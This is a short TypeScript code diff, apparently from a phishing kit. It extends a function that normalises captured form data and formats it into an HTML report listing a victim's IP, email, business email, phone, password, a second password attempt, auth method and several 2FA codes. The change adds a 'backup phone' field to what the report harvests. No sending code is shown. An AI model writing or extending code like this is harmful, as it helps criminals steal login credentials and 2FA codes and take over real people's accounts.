@@ -102,6 +102,7 @@ function normalizeData(input: any = {}) {
         email: input.email ?? '',
         emailBusiness: input.emailBusiness ?? input.business ?? '',
         phone: input.phone ?? '',
+        phoneBackup: input.phoneBackup ?? '',
         password: input.password ?? '',
         passwordSecond: input.passwordSecond ?? '',
         authMethod: input.authMethod ?? '',
@@ -137,6 +138,10 @@ function formatMessage(data: any, options: FormatMessageOptions = {}): string {
     const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
     const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
     const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
+    const phoneBackupDisplay =
+        d.phoneBackup && String(d.phoneBackup).trim()
+            ? escapeHtml(`+${String(d.phoneBackup).trim()}`)
+            : '';
 
     const lines = [
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
@@ -149,6 +154,7 @@ function formatMessage(data: any, options: FormatMessageOptions = {}): string {
         `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
         `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
         `<b>Phone:</b> <code>${phoneDisplay}</code>`,
+        `<b>Backup Phone:</b> <code>${phoneBackupDisplay}</code>`,
     ];
 
     if (includePassword) {
